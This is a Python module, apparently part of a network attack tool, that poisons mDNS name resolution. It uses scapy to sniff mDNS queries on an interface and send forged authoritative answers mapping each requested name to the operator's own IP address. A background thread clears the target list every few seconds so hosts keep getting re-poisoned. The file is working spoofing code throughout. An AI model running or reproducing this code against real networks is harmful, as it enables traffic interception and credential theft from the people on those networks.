#!/usr/bin/env python
# -*- coding: utf-8 -*-


from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet, IPv6
from .poisoninfo import PoisonNetworkInfo
import time
from threading import Thread


class MDNS(PoisonNetworkInfo):
    def __init__(self, ip: str, ipv6: str, mac_address: str, iface: str):
        super().__init__(ip, ipv6, mac_address, iface)
        self._targets_used = []

    @property
    def targets_used(self):
        return self._targets_used

    @targets_used.setter
    def targets_used(self, ip):
        self.targets_used.append(ip)

    def dns_record(self, pkt: packet) -> DNSRR:
        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def data_link_layer(self, pkt: packet) -> None:
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    def network_layer(self, pkt, response):
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def transport_layer(self, response: packet) -> packet:
        response /= UDP(sport="mdns", dport="mdns")
        return response

    def application_layer(self, pkt: packet, response: packet) -> packet:
        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=self.dns_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        if ip_of_the_packet not in self.targets_used:
            print("Sending packet to " + ip_of_the_packet)
            sendp(response, verbose=False)
            self.targets_used = ip_of_the_packet

    def filter_for_mdns(self, pkt: packet) -> bool:
        return (
            pkt.haslayer(DNS)
            and (pkt.haslayer(IP) or pkt.haslayer(IPv6))
            and pkt[DNS].qd is not None
        )

    def mdns_checking_packets(self, pkt: packet) -> None:
        if self.filter_for_mdns(pkt):
            response = self.data_link_layer(pkt)
            response, ip_of_the_packet = self.network_layer(pkt, response)
            response = self.transport_layer(response)
            response = self.application_layer(pkt, response)
            self.send_packet(response, ip_of_the_packet)

    def start_mdns_poisoning(self) -> None:
        # Port of mdns 5353
        # filter="udp and port mdns",
        cleaner_trhead = Thread(target=self.cleaner)
        cleaner_trhead.daemon = True
        cleaner_trhead.start()
        sniff(
            filter="udp and port mdns",
            iface=self.iface,
            prn=self.mdns_checking_packets,
            store=0,
        )

    def cleaner(self):
        while True:
            time.sleep(3)
            self.targets_used.clear()
